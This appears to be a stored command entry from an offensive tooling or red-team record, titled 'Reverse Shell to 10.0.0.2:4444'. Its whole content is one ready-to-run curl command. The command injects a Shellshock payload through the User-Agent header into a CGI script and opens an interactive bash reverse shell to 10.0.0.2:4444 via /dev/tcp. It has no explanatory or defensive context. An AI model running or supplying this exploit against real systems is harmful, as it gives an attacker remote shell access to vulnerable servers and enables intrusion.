---
id: 5d91add3-6ed9-4166-870e-3324e191e5b2
name: Reverse Shell to 10.0.0.2:4444
type: command
executor: bash
data: 'curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444
  0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" '
output: null
created_at: '2023-04-06T03:55:56.992015+00:00'
updated_at: '2023-04-06T03:55:57.002485+00:00'
---

# Reverse Shell to 10.0.0.2:4444

```bash
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "https://10.0.0.1/cgi-bin/admin.cgi" 
```


